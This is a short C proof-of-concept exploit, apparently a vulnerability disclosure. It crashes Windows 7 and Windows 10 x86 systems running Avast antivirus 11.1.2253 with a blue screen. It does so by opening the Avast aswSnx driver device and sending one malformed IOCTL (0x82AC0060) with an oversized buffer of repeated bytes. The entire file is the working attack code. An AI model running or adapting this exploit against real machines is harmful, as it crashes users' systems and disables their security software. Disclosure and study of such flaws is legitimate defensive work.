/**
* Author: bee13oy
* BSoD on Windows 7 x86 / Windows 10 x86  + Avast Premier / Avast Free Antivirus (11.1.2253)
**/

#include <Windows.h>

void BSoD1(const char* szDeviceName)
{
	HANDLE hDevice = CreateFileA(szDeviceName, 
		GENERIC_READ, 
		0, 
		NULL, 
		OPEN_EXISTING, 
		0, 
		NULL);

	if (hDevice != INVALID_HANDLE_VALUE)
	{
#define MAX_BUFSIZE 0x1000
		BYTE bufInput[MAX_BUFSIZE] = "";
		BYTE bufOutput[MAX_BUFSIZE] = "";

		memset(bufInput, 0x28, MAX_BUFSIZE);

		DWORD nbBytes = 0;
		DWORD status = DeviceIoControl(hDevice, 
			0x82AC0060, 
			&bufInput, 
			0x80C, 
			&bufOutput, 
			0x80C,
			&nbBytes, 
			NULL
			);
	}
}

int _tmain(int argc, _TCHAR* argv[])
{

	BSoD1("\\\\.\\aswSnx");

	return 0;
}

